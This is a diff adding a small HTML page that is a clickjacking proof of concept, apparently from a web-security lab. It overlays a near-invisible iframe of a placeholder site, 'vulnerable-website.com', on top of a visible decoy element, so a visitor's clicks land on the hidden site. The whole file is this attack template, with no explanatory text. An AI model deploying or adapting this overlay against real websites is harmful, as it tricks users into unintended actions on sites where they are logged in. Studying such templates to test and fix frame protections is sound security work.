@@ -1,0 +1,35 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title>Dev</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+      #target_website {
+        position:relative;
+        width:128px;
+        height:128px;
+        opacity:0.00001;
+        z-index:2;
+        }
+      #decoy_website {
+        position:absolute;
+        width:300px;
+        height:400px;
+        z-index:1;
+        }
+    </style>
+</head>
+<body>
+<center>
+  <br>
+<p>22</p>
+<br><br>
+<div id="decoy_website">
+	...decoy web content here...
+	</div>
+	<iframe id="target_website" src="https://vulnerable-website.com">
+	</iframe>
+</center>
+</body>
+</html>
